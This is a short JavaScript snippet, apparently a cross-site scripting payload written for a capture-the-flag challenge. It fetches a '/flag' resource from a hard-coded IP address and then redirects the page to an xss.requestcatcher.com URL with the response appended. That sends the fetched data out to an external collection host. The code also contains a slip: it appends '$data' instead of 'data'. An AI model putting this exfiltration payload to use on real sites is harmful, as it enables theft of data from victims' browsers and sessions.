async function xss() {
  try {
    const response = await fetch('http://165.232.190.5:1900/flag');
    const data = await response.text();
    console.log(data);
    document.location="https://xss.requestcatcher.com/test"+$data;
  }

  catch (error) {
    console.error('Error:', error);
  }
}

xss();
